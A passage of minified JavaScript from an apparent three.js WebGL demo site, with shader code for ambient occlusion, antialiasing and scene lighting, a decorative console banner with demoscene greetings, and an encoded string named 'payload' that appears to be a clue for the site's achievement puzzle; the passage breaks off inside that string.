length(abs(crt3)*abs(crt3)*abs(crt3)*abs(crt3)) - tube;\nvec3 n = vec3(-deltaX * 100.0, -deltaY * 100.0, 1.0);\nfloat shade = max(-0.5, dot(n, normalize(vec3(10.0, 10.0, 1.0)))) * .5;\nshade = shade * abs(shade);\ngl_FragColor = vec4(bars * mask * sqrt(shade + color), 1.0);\n}"};
Acko.SSAOShader={uniforms:{tDiffuse:{type:"t",value:null},tDepth:{type:"t",value:null},size:{type:"v2",value:new THREE.Vector2(512,512)},resolution:{type:"v2",value:new THREE.Vector2(1/512,1/512)},cameraNear:{type:"f",value:1},cameraFar:{type:"f",value:100},seed:{type:"f",value:1}},vertexShader:"varying vec2 vUV;\nvoid main() {\nvUV = uv;\nvec2 xy = uv * 2.0 - 1.0;\ngl_Position = vec4(xy, 1.0, 1.0);\n}",fragmentShader:"uniform float cameraNear;\nuniform float cameraFar;\nuniform float seed;\nuniform vec2 size;\nuniform sampler2D tDiffuse;\nuniform sampler2D tDepth;\nvarying vec2 vUV;\n#define DL 2.399963229728653\n#define EULER 2.718281828459045\nfloat width = size.x;\nfloat height = size.y;\nfloat cameraFarPlusNear = cameraFar + cameraNear;\nfloat cameraFarMinusNear = cameraFar - cameraNear;\nfloat cameraCoef = 2.0 * cameraNear;\nconst int samples = 8;\nconst float radius = 4.0;\nconst bool useNoise = false;\nconst float noiseAmount = 0.0003 * 4.0;\nconst float diffArea = 0.4;\nconst float gDisplace = 0.4;\nfloat unpackDepth(const in vec4 rgba_depth) {\nconst vec4 bit_shift = vec4(1.0 / (256.0 * 256.0 * 256.0), 1.0 / (256.0 * 256.0), 1.0 / 256.0, 1.0);\nfloat depth = dot(rgba_depth, bit_shift);\nreturn depth;\n}\nvec2 rand(const vec2 coord) {\nvec2 noise;\nif (useNoise) {\nfloat nx = dot (coord, vec2(12.9898, 78.233));\nfloat ny = dot (coord, vec2(12.9898, 78.233) * 2.0);\nnoise = clamp(fract (43758.5453 * sin(seed + vec2(nx, ny))), 0.0, 1.0);\n} else {\nfloat ff = fract(1.0 - coord.s * (width / 2.0));\nfloat gg = fract(coord.t * (height / 2.0));\nnoise = vec2(0.25, 0.75) * vec2(ff) + vec2(0.75, 0.25) * gg;\n}\nreturn (noise * 2.0 - 1.0) * noiseAmount;\n}\nfloat readDepth(const in vec2 coord) {\nreturn cameraCoef / (cameraFarPlusNear - unpackDepth(texture2D(tDepth, coord)) * cameraFarMinusNear);\n}\nfloat compareDepths(const in float depth1, const in float depth2, inout int far) {\nfloat garea = 2.0;\nfloat diff = (depth1 - depth2) * 100.0;\nif (diff < gDisplace) {\ngarea = diffArea;\n} else {\nfar = 1;\n}\nfloat dd = diff - gDisplace;\nfloat gauss = pow(EULER, -2.0 * dd * dd / (garea * garea));\nreturn gauss;\n}\nfloat calcAO(float depth, float dw, float dh) {\nfloat dd = radius - depth * radius;\nvec2 vv = vec2(dw, dh);\nvec2 coord1 = vUV + dd * vv;\nvec2 coord2 = vUV - dd * vv;\nfloat temp1 = 0.0;\nfloat temp2 = 0.0;\nint far = 0;\ntemp1 = compareDepths(depth, readDepth(coord1), far);\nif (far > 0) {\ntemp2 = compareDepths(readDepth(coord2), depth, far);\ntemp1 += (1.0 - temp1) * temp2;\n}\nreturn temp1;\n}\nvoid main() {\nvec2 noise = rand(vUV);\nfloat depth = readDepth(vUV);\nfloat tt = clamp(depth, .3, 1.0);\nfloat w = (1.0 / width)  / tt + (noise.x * (1.0 - noise.x));\nfloat h = (1.0 / height) / tt + (noise.y * (1.0 - noise.y));\nfloat pw;\nfloat ph;\nfloat ao;\nfloat dz = 1.0 / float(samples);\nfloat z = 1.0 - dz / 2.0;\nfloat l = 0.0;\nfor (int i = 0; i <= samples; i ++) {\nfloat r = ((1.0 - z) + sqrt(1.0 - z)) * .5;\npw = cos(l) * r;\nph = sin(l) * r;\nao += calcAO(depth, pw * w, ph * h);\nz = z - dz;\nl = l + DL;\n}\nao /= float(samples);\nao = 1.0 - ao * .8;\ngl_FragColor = vec4(ao, ao, ao, 1.0);\n}"};
Acko.SSAOUpShader={uniforms:{tDiffuse:{type:"t",value:null},tDepth:{type:"t",value:null},tAO:{type:"t",value:null},size:{type:"v2",value:new THREE.Vector2(512,512)},resolution:{type:"v2",value:new THREE.Vector2(1/512,1/512)},cameraNear:{type:"f",value:1},cameraFar:{type:"f",value:100},seed:{type:"f",value:1},lumInfluence:{type:"f",value:.9}},vertexShader:"varying vec2 vUV;\nvoid main() {\nvUV = uv;\nvec2 xy = uv * 2.0 - 1.0;\ngl_Position = vec4(xy, 1.0, 1.0);\n}",fragmentShader:"uniform float cameraNear;\nuniform float cameraFar;\nuniform float seed;\nuniform vec2 resolution;\nuniform vec2 size;\nuniform sampler2D tDiffuse;\nuniform sampler2D tDepth;\nuniform sampler2D tAO;\nuniform float lumInfluence;\nvarying vec2 vUV;\nfloat dx = resolution.x;\nfloat dy = resolution.y;\nfloat width = size.x;\nfloat height = size.y;\nfloat cameraFarPlusNear = cameraFar + cameraNear;\nfloat cameraFarMinusNear = cameraFar - cameraNear;\nfloat cameraCoef = 2.0 * cameraNear;\nfloat unpackDepth(const in vec4 rgba_depth) {\nconst vec4 bit_shift = vec4(1.0 / (256.0 * 256.0 * 256.0), 1.0 / (256.0 * 256.0), 1.0 / 256.0, 1.0);\nfloat depth = dot(rgba_depth, bit_shift);\nreturn depth;\n}\nfloat readDepth(const in vec2 coord) {\nreturn cameraCoef / (cameraFarPlusNear - unpackDepth(texture2D(tDepth, coord)) * cameraFarMinusNear);\n}\nvoid main() {\nvec2 uv = floor((vUV + resolution * .5) * size) * resolution - resolution * .5;\nfloat d = readDepth(vUV);\nfloat aoNW = texture2D(tAO, uv + vec2(0, 0)).r;\nfloat aoNE = texture2D(tAO, uv + vec2(dx, 0)).r;\nfloat aoSW = texture2D(tAO, uv + vec2(0, dy)).r;\nfloat aoSE = texture2D(tAO, uv + vec2(dx, dy)).r;\nfloat dNW = readDepth(uv + vec2(0, 0)) - d;\nfloat dNE = readDepth(uv + vec2(dx, 0)) - d;\nfloat dSW = readDepth(uv + vec2(0, dy)) - d;\nfloat dSE = readDepth(uv + vec2(dx, dy)) - d;\nfloat wNW = max(0.000001, .00001-dNW*dNW);\nfloat wNE = max(0.000001, .00001-dNE*dNE);\nfloat wSW = max(0.000001, .00001-dSW*dSW);\nfloat wSE = max(0.000001, .00001-dSE*dSE);\nfloat wT = 1.0 / (wNW+wNE+wSW+wSE);\nfloat ao = (aoNW*wNW + aoNE*wNE + aoSW*wSW + aoSE*wSE) * wT;\nvec4 sample = texture2D(tDiffuse, vUV);\nvec3 color = sample.rgb*sample.rgb;\nvec3 lumcoeff = vec3(0.299, 0.587, 0.114);\nfloat lum = dot(color.rgb, lumcoeff);\nvec3 luminance = vec3(lum);\nvec3 final = vec3(color * mix(vec3(ao), vec3(1.0), luminance*lumInfluence));\ngl_FragColor = vec4(sqrt(final),  1.0);\n}"};
THREE.FXAAShader={uniforms:{tDiffuse:{type:"t",value:null},resolution:{type:"v2",value:new THREE.Vector2(1/1024,1/512)}},vertexShader:"varying vec2 vUv;\nvoid main() {\nvUv = uv;\ngl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\n}",fragmentShader:"uniform sampler2D tDiffuse;\nuniform vec2 resolution;\nvarying vec2 vUv;\n#define FXAA_REDUCE_MIN   (1.0/128.0)\n#define FXAA_REDUCE_MUL   (1.0/8.0)\n#define FXAA_SPAN_MAX     8.0\nvoid main() {\nvec4 rgbaNW = texture2D( tDiffuse, ( gl_FragCoord.xy + vec2( -1.0, -1.0 ) ) * resolution );\nvec4 rgbaNE = texture2D( tDiffuse, ( gl_FragCoord.xy + vec2( 1.0, -1.0 ) ) * resolution );\nvec4 rgbaSW = texture2D( tDiffuse, ( gl_FragCoord.xy + vec2( -1.0, 1.0 ) ) * resolution );\nvec4 rgbaSE = texture2D( tDiffuse, ( gl_FragCoord.xy + vec2( 1.0, 1.0 ) ) * resolution );\nvec4 rgbaM  = texture2D( tDiffuse,  gl_FragCoord.xy  * resolution );\nvec3 rgbNW  = rgbaNW.xyz;\nvec3 rgbNE  = rgbaNE.xyz;\nvec3 rgbSW  = rgbaSW.xyz;\nvec3 rgbSE  = rgbaSE.xyz;\nvec3 rgbM   = rgbaM.xyz;\nvec3 luma = vec3( 0.299, 0.587, 0.114 );\nfloat lumaNW = dot( rgbNW, luma );\nfloat lumaNE = dot( rgbNE, luma );\nfloat lumaSW = dot( rgbSW, luma );\nfloat lumaSE = dot( rgbSE, luma );\nfloat lumaM  = dot( rgbM,  luma );\nfloat lumaMin = min( lumaM, min( min( lumaNW, lumaNE ), min( lumaSW, lumaSE ) ) );\nfloat lumaMax = max( lumaM, max( max( lumaNW, lumaNE) , max( lumaSW, lumaSE ) ) );\nvec2 dir;\ndir.x = -((lumaNW + lumaNE) - (lumaSW + lumaSE));\ndir.y =  ((lumaNW + lumaSW) - (lumaNE + lumaSE));\nfloat dirReduce = max( ( lumaNW + lumaNE + lumaSW + lumaSE ) * ( 0.25 * FXAA_REDUCE_MUL ), FXAA_REDUCE_MIN );\nfloat rcpDirMin = 1.0 / ( min( abs( dir.x ), abs( dir.y ) ) + dirReduce );\ndir = min( vec2( FXAA_SPAN_MAX,  FXAA_SPAN_MAX),\nmax( vec2(-FXAA_SPAN_MAX, -FXAA_SPAN_MAX),\ndir * rcpDirMin)) * resolution;\nvec3 rgbA = 0.5 * (\ntexture2D( tDiffuse, gl_FragCoord.xy  * resolution + dir * ( 1.0 / 3.0 - 0.5 ) ).xyz +\ntexture2D( tDiffuse, gl_FragCoord.xy  * resolution + dir * ( 2.0 / 3.0 - 0.5 ) ).xyz );\nvec3 rgbB = rgbA * 0.5 + 0.25 * (\ntexture2D( tDiffuse, gl_FragCoord.xy  * resolution + dir * -0.5 ).xyz +\ntexture2D( tDiffuse, gl_FragCoord.xy  * resolution + dir * 0.5 ).xyz );\nfloat lumaB = dot( rgbB, luma );\nif ( ( lumaB < lumaMin ) || ( lumaB > lumaMax ) ) {\ngl_FragColor = vec4( rgbA, 1.0 );\n} else {\ngl_FragColor = vec4( rgbB, 1.0 );\n}\n}"};
Acko.TrackShader={uniforms:{tGeometry:{type:"t",value:null},sampleStep:{type:"v2",value:new THREE.Vector2},opacity:{type:"f",value:1},blackhole:{type:"f",value:1},ambientCorrection:{type:"f",value:0},ambientOcclusion:{type:"f",value:1},center:{type:"v3",value:_v()},fogBegin:{type:"f",value:2200},displacement:{type:"f",value:0}},vertexShader:"uniform sampler2D tGeometry;\nuniform vec2 sampleStep;\nuniform float blackhole;\nuniform float ambientOcclusion;\nvarying vec3 vNormal;\nvarying vec3 vView;\nvarying vec3 vColor;\nvarying float vAO;\nvarying vec3 vZenith;\nvarying vec3 vSun;\nattribute vec3 color;\nuniform vec3 center;\nuniform float displacement;\nvoid main() {\nvec2 uv = position.xy;\nvec4 posSample = texture2D(tGeometry, uv);\nvec4 normalSample = texture2D(tGeometry, uv + vec2(sampleStep.x, 0));\nvNormal = normalize(normalMatrix * normalSample.xyz);\nvec3 pos = posSample.xyz;\nif (blackhole > 0.701) {\nfloat ramp = sin(clamp((blackhole - .701), 0.0, 1.0)*1.57);\nvec3 pos2 = pos - center;\npos2.y *= 2.0;\nfloat scale = length(pos2) / 300.0 - blackhole + 1.25;\nscale = clamp(scale, 0.0, 1.25);\nif (scale > .75) scale = 1.0 - (1.25 - scale)*(1.25 - scale);\npos = pos2 * mix(1.0, scale, ramp);\npos.y *= .5;\npos += center;\n}\n/* To show displacement in action */\npos = mix(pos, position.xyz * vec3(800.0, 500.0, 1.0) - vec3(400.0, 100.0, 0.0), displacement);\nvec4 mvPos = modelViewMatrix * vec4(pos, 1.0);\ngl_Position = projectionMatrix * mvPos;\nvAO = mix(1.0, posSample.w, ambientOcclusion);\nvView = -mvPos.xyz;\nvColor = color;\nvSun = (normalMatrix * vec3(.416, .371, .619));\nvZenith = (normalMatrix * vec3(0.0, 1, 0.0));\n}",
depthVertexShader:"uniform sampler2D tGeometry;\nuniform float blackhole;\nuniform vec3 center;\nvoid main() {\nvec2 uv = position.xy;\nvec4 posSample = texture2D(tGeometry, uv);\nvec3 pos = posSample.xyz;\nif (blackhole > 0.701) {\nvec3 pos2 = pos - center;\npos2.y *= 2.0;\nfloat scale = length(pos2) / 300.0 - blackhole + 1.25;\nscale = clamp(scale, 0.0, 1.25);\nif (scale > .75) scale = 1.0 - (1.25 - scale)*(1.25 - scale);\npos = pos2 * scale;\npos.y *= .5;\npos += center;\n}\ngl_Position = projectionMatrix * modelViewMatrix * vec4(pos, 1.0);\n}",
fragmentShader:"uniform float opacity;\nuniform float ambientCorrection;\nuniform float blackhole;\nuniform float fogBegin;\nvarying vec3 vNormal;\nvarying vec3 vView;\nvarying vec3 vColor;\nvarying float vAO;\nvarying vec3 vZenith;\nvarying vec3 vSun;\nfloat leClamp(float x) {\nreturn clamp(x, 0.0, 1.0);\n}\nfloat noise() {\nreturn fract(sin(dot(cameraPosition.xz, gl_FragCoord.xy + vec2(3.1380 + blackhole, 7.41)) * 13.414) * 1414.32);\n}\nvoid main() {\nvec3 diffuse = leClamp(dot(normalize(vNormal), vSun)) * vec3(1.5, 1., .7)+ leClamp(dot(vNormal, vZenith)) * vec3(.1, .4, .5);\ndiffuse = diffuse * (.5 - ambientCorrection) + (.5 + ambientCorrection);\nvec3 halfDir = normalize(normalize(vView) + vSun);\nfloat specular = pow(leClamp(dot(vNormal, halfDir)), 4.0) * (1.0 + ambientCorrection);\nvec3 specColor = sqrt(vColor) * .15;\nfloat nlen = length(vNormal);\nfloat outline = clamp(3.0 - nlen * nlen * 3.0, 0.0, 1.0);\nfloat lum = dot(diffuse, vec3(0.299, 0.587, .114));\nvec3 ao = mix(vColor*(vAO*vAO+vAO)*.5, vec3(vAO), lum);\nvec3 color = (noise() * .04 + .96) * ao * (diffuse * vColor * (1.0 + outline * .35) + specular * specColor);\nfloat distance = length(vView);\nfloat fog = min(1.0, exp(-(distance - fogBegin) * .00022));\ngl_FragColor = vec4(sqrt(mix(vec3(1.0,1.0,1.0), color, fog * opacity)), 1.0);\n}"};
Acko.SolidShader={uniforms:{opacity:{type:"f",value:0},ambientCorrection:{type:"f",value:0},fogBegin:{type:"f",value:2200}},vertexShader:"varying vec3 vNormal;\nvarying vec3 vView;\nattribute vec3 color;\nvarying vec3 vColor;\nvarying vec3 vZenith;\nvarying vec3 vSun;\nvoid main() {\nvNormal = normalMatrix * normal;\nvec4 mvPos = modelViewMatrix * vec4(position, 1.0);\ngl_Position = projectionMatrix * mvPos;\nvView = -mvPos.xyz;\nvColor = color;\nvSun = (viewMatrix * vec4(.416, .371, .619, 0.0)).xyz;\nvZenith = (viewMatrix * vec4(0.0, 1, 0.0, 0.0)).xyz;\n}",
depthVertexShader:"void main() {\ngl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);\n}",fragmentShader:"uniform float opacity;\nuniform float ambientCorrection;\nuniform float fogBegin;\nvarying vec3 vNormal;\nvarying vec3 vView;\nvarying vec3 vColor;\nvarying vec3 vZenith;\nvarying vec3 vSun;\nfloat leClamp(float x) {\nreturn clamp(x, 0.0, 1.0);\n}\nvoid main() {\nvec3 diffuse = leClamp(dot(normalize(vNormal), vSun)) * vec3(1.5, 1., .6)+ leClamp(dot(vNormal, vZenith)) * vec3(.1, .4, .5);\ndiffuse = diffuse * (.5 - ambientCorrection) + .5 + ambientCorrection;\nvec3 halfDir = normalize(normalize(vView) + vSun);\nfloat specular = pow(leClamp(dot(vNormal, halfDir)), 8.0) * (1.0 + ambientCorrection);\nvec3 specColor = sqrt(vColor) * .35;\nfloat nlen = length(vNormal);\nfloat outline = clamp(3.0 - nlen * nlen * 3.0, 0.0, 1.0);\nvec3 color = (diffuse * vColor * (1.0 + outline * .35) + specular * specColor);\nfloat distance = length(vView);\nfloat fog = min(1.0, exp(-(distance - fogBegin) * .00022));\ngl_FragColor = vec4(sqrt(mix(vec3(1.0,1.0,1.0), color, fog * opacity)), 1.0);\n}"};
var colorize=function(){return navigator.userAgent.match(/Chrome/)},bar=function(){for(var a="",b=0,c=0;80>c;++c)b=Math.floor(b+3.2*Math.random()+1)%4,a+="\u25e4\u25e2\u25e3\u25e5"[b];colorize()?console.log("%c"+a,"background: -webkit-linear-gradient(rgb(81,162,189), rgb(68,105,133)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 1px 1px 0px rgba(0,0,0, .2);"):console.log(a)},flair=function(){var a="\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2587\u2588\u258d\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581 \u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2583\u2587\u2588\u2588\u2588\u2586\u2581\u2581\u2581\u2583\u2587\u2588\u2588\u2588\u2588\u258d\u2581\u2581\u2588\u2588\u258d\u2581\u2581\u2583\u2587\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2587\u2583\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581 \u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2582\u2588\u2588\u2581\u2581\u2581\u2588\u2588\u258d\u2581\u2588\u2588\u258d\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2588\u2588\u258d\u2584\u2588\u2588\u2581\u2581\u2581\u2585\u2583\u2581\u2581\u2581\u2581\u2581\u2588\u2588\u258d\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581 \u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2584\u2588\u2588\u2581\u2581\u2581\u2581\u2588\u2588\u258d\u2581\u2588\u2588\u2582\u2581\u2581\u2581\u2581\u2581\u2581\u2582\u2588\u2588\u2581\u2581\u2588\u2588\u258d\u2581\u2581\u2588\u2588\u2582\u2581\u2581\u2581\u2582\u2588\u2588\u258d\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581 \u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2582\u2584\u2586\u2588\u2588\u2581\u2581\u2581\u2581\u2581\u2581\u2588\u2588\u258d\u2581\u2581\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2581\u2581\u2581\u2581\u2588\u2588\u258d\u2581\u2581\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581 \u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2588\u2588\u258d\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581\u2581unconed\u2581\u2581\u2581\u2581\u2581\u2581\u2581".split(" ");
bar();colorize()?a.forEach(function(a){var c=[];a=a.replace(/\u2581+/g,function(a){c.push("color: white;");c.push("color: rgb(68,105,133); background: -webkit-linear-gradient(rgb(99,199,231), rgb(68,105,133)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 3px 3px 0px rgba(0,0,0, .2), 0px 0px 20px rgba(128,190,220, 1.0);");return"%c\u2595"+a.substring(1)+"%c"});c.unshift(a);console.log.apply(console,c)}):a.forEach(function(a,c){console.log(a)});bar();["","         Greetz to mrdoob, iq, alteredqualia, p01, pyalot, flexi23,",
"                   aerotwist, kuvos, romancortes, jerome_etienne","                   and a basket of puppies for pouet.",""].forEach(function(a,c){a+="                                                                                ".substring(a.length);colorize()?3>c?console.log("%c"+a.substring(0,19)+"%c"+a.substring(19),"color: rgb(83,128,162)","color: rgb(81,163,189); font-weight: bold;"):console.log("%c"+a,"color: rgb(83,128,162)"):console.log(a)});bar();console.log("THREE.js "+THREE.REVISION);
setTimeout(function(){bar();colorize()?console.log("\nWelcome. Poke around %cgl.effects%c and %ccss3d.effects%c to see how things work. Maybe try to %cachieve%c something?","background-color: #eee; padding: 2px","","background-color: #eee; padding: 2px","","background-color: #eee; padding: 2px",""):console.log("\nWelcome. Poke around `gl.effects` and `css3d.effects` to see how things work. Maybe try to `achieve` something?")},1E3);hasAchievement("chtr")&&1377676089325>+new Date&&setTimeout(function(){colorize()?
console.warn("There are %cnew clues%c inside chtr.js","font-weight:bold;",""):console.warn("There are new clues inside chtr.js.")},2E3)};flair();
/*!*/ payload = ",/\"&/cpihqofi/-sy py-#(x'3$`#/d'l}mf}afi%`qji. |aedtmvq$`gf|oif'oc|nn- sofivbvw}d%<,nrfhpmid!pmeJyK*beo/fYK |sdu+cij:aqfd|bkj.}o)~~e$nej}!x38<<<sdu+rbkU:2:2<0542:'214=zbrrxf#rmj[<xx.#,=fu$nwn~oh;Q{`ysc{sGicebq`ggAwdjnX=+'qez'`n9,}w k*=]U<42$;772~hu%rj6^.rz.(*8E`e&*?=2>[= |{.1klkzgeb>'ulvo_%<riu(mL`ceg8W(ugurEs euo}bk)crefr`hi,{rl'w-}'1101=~ft'kie81;:7>'nFsreg'b}ikmkh*fjAhte//|V*q%i{'g8?:23y;'b}ikmkh*-! /}9>73$944tfT['xwsl$2ubp}uf+ee`1t,30492(?9=8shz)cctBo8Y'ub`}dm#bLbofk$`sfdrnef+ofe |'om+.^%<riu(JiFn7:7=>(<67<3=302zlspwi+DkKo<y$7!0smhnfr&Y\"W:`rdkwlff!#!,|#csgdsmgi ycv/q!~/Oa~rkse/91;<:z,>62=(=?6?=7;;*2232-nshksohd dnb%n,~qjw&Y}eipu5)&y/\" x!./3*46>;8wl||uk%a~ke}nhj (\"ret*p8;06;)449\",,r=<65>qjw&mcWgy~5Pbejyl) }{!+$a/|M'T3gfsl`jqi{<>4>13}ev&c}jiW;S\\[Z1*uied+<<41:>30>7*>4;0ret*}t5Y(rnv/nlSfxq%nqjfZ,=RZ<riu(cvnnx4Z&kgx/rv&nvkj|`hk-sitw}.|&!%3}ev&CLid;.sz/<ymwQ`elhpq<y`r|ui$ABdg?y/1dz&~dEHB}510>;214<7%64;<(.!7$v?b`*gw}rcz</zq 87<<1*8ca+wg<Z_s.ao,jic}ffs`$``pro+`j}mbw+X6`k)ufr3>9<*57:<>!{=oo&ix}w`{3 z~-<250;*:c`'zjr?1?;=%}/ovj+lZoi!ffnqfi~c*xFe,qE|ykw(U4bnq~o'tf|3!boH{scX%0258)13>43:43?'2,u518)53;2$bbdkVgwq`u!r/:mnP(yer=?9=&>294=.ws+> u+%?\"}@rr[eICe}lBvt-%5:232 mS\\pm}~o )3?<3<.pfrg}igiMybglMu/+$m(2$lnd_niaQ,)4=0)5?>2,bnerog}cqlmwora$)18:4?\"a~r{wvrbj{x#(3;<+?37:=!`eYkgnzlawmUsmixd (979%471>3\"{rw@tlEhXdaNcnduwd,~.4vFf(ui}.+=()sit&{fcq*goks*2*2=1:>.orig|nge,hq&{le*n`Rl.q>6=<&=5>sfy%4/|#efqx`bb~dwQcUjTv 0*#shz)o8^Zx'{ <\\Y3/sv-?$dchyiC(qgu*ybf5}up`[W%phu'a~fd+pa$1dz&T5/} riG@pJPemtLsiKzm >:4=?(#pg{jEhLmuSxdqcf/32=<4'\"epnr/=*hFprkf%~gt(~dh7005;6++\"dcxiLzdBLls{,>2?8=)/ken}wBh}ks.2!|x,+,hsmQdl{tfci#<QTx!=+=5?71:508&127>*<440<X*mfkc,}*l|kkrogi..q* '2~hu%Jb645<)771<SV?vc~|wf&Im<{.1=16?&?6=>qjw&hw:[&ji{,V*l|kkrogi.t~!x'z~'cpihqofi'we/!pwarCgqmtpik{$(3ud{(xtcRTQ8>:31*>>=0&,ofa'3tc|rti*ypc^[S<x,<oje|jbj|)jd`}=QT>',w('&'`(-q)\"&>524v,. <6<;?&961=xlt}cu|FhngiwlffOudhb0>$|'aqfd|bkj&f!,sZ$('pfx(lw`o`idi::71=pQ$nrfhpmid)|t.!|Z[V*#shz)wApT`8ulsNj|bz}ehd`Dt(pgz'atm~Go4ST_YY[)xpeWk^i[*vnnoo+>%?>>1=%!*8'c*2<*/ZP8nmaa$zf~!+?) wmwsmtrFdand}afiCwff`=+m} (qiy$a`~sdK;+:02?r*84;9=<pkcncogbc?nfoks,%2*\"/.!z/z1}tbs(gupqby>}nimniA0-y}\"4pa|(ugq1857>%r.nKp'`ulvw(itK'rut\"gjarefr`+k|Fgl yfh+X6drdba$zf~0&jtc|de$=!z=`y`nc)f{rq`u0,{r/<2;606cwngo%zgp3.{|\"s*wp ghlqdep`%d}g okja*Y1?2:(3905<:05<2:847(<V440)74?6S6epChl%zgp3sshoejQ}mz<1<4=>7<>6?U\\5h~g&xhss/l{/hhc|`k|n!-*><)`s('aqfd|bkj&|`s /}%612<ui'2~hu%wBcr;$020=<'!11=:/'=piu&clMr8-,'fuukr-rant+\">08*36:>/'*gz`sjofwv&\"%n}fc%phu'fi(To&,% >9469)4133+c|fjslji#a*bsh^cc$iGtaa ~0049)06<3ud{(f:'s%0sg{'o9SZ3)f.$1:0=>=*sB%1~bw)y{mpqf6^4?66*<39V?362'=07=;46)>::>i{'v_x8Y'anh|bz#l(`gf|oif//|(Gk%i{'uhs62>86ms7%3}ev&{g8%4192=*810<2zlspwi+th2z.?<4?;*63?2sit&Jejto5\\+jggsdlix-n%%B}rk# &-=QT>~gt(wP:<:40'??>>-%je&orig|nge$apke-!}4?60)302xI(fw%m~til',ueh!)-?]W20>763*36898shz)EaU:976;)11;z!#-?to}pzh&laCv%\"(=>>7/*<vx=$6100<>?4<=|hw(|gFq;\\W3ud{(la8\\PX[2536><<<44(2;43pgz'Rhh~>^<9>5)34;6*$412<+=35=(>90U=3:26)291>!st.>-|v,=fu$}M`YJ9Y$oldrcz/cn$epgk}njk/oM*yimpc.s}ev&~xTf;500><'?6183$>7120sg{'dt}~c9203;>*`~|cxh\"*8wl||uk%d{p~o<y!<*)?rgx)m^thb:Y)igmqhagt-`o)7:5>*=3=\"?,`gf|oif//||iq%z5$057<}dt)h~h538?3*4>2*\"&(kik*\",Znm}Ffmnnscdbip5a}egpoeg-ab/s\\[<Cfelga}~>-a~ke}nhj qoz-]Wt, /='-&*dli)\"&u`qryk&yjs,dn{_tk~!ll/['-$G`hhpFuT\\~,/gdpl'ikaskeqb&(#*!={3feocmu`dmgs8-a~ke}nhj .s:65(8<73741)37=3!xo}gdqlhe%cY/.SZu{avgo)c}he|nii*mude  |-~z\"xbjme&32?;=*091>*bxmjsdI*8(=192>sfy%odB:7=6?%2331dz&bmkg~796593~nkah|>ulsSmebg~p,`gf|oif//|\"nvkj|`hk-k'`ihu.~fz+fj`k{i57501(1>1~,!!2qdw'@Qjmm:_*%$)uu:(%^U*+>?6>W3Jkoagnq|<&221<25;5&802=|hw(kd}n;\\ymwLg|lusdk'(1<>2( |u\"(_[&05=2[3tcs^an`f}}<367%45;<qez'e{9[(p`u MRdcl+gjvl 3RZ>sfy%k{t}9W)ejt,kz%c}he|nii\"{Jc s;?31)96?2qfv(b@LPb;(3o$pgz'o}Xc>2118n`kb7%`|idpahf+U~a\" ~lie}jci~&ajmqt!'>2:07'??=3umqvh*lMOR`3z/<nmodp5<75>z'acef~-3umqvh*opferahh/cl/nlq |'%qjw&-:43:2&;==ocsj,~ZT%=qkz#h4%>76>180(916?SZ3}ev&k4bmrU|htfmm+\"hkan`sbf`h}t +\" mqje~`jf.g$oMMhp/tdze,~4<06'070u. \"?rgx)n}cj5*???>)* 3&-,x<fvPX'iv}smy?359'==>53%wODiM8}ey'wdqpe$4jtRY'zjr?2:10s/uzpl_&lRcd}n/kjnfh|a+sepl`t,bd`c&Y;}chd(qd3+fibcdO~+<.wg+kLvb.yglirhgd(X7nrmcy'wdq072?)60:<1920=#t'lis(skw*zbs)l)ma%ujs&x%[;(Co+vep*mnx~gpm1229.8Cga~q`'ydp)%[9OLc||a&xhs(d$2 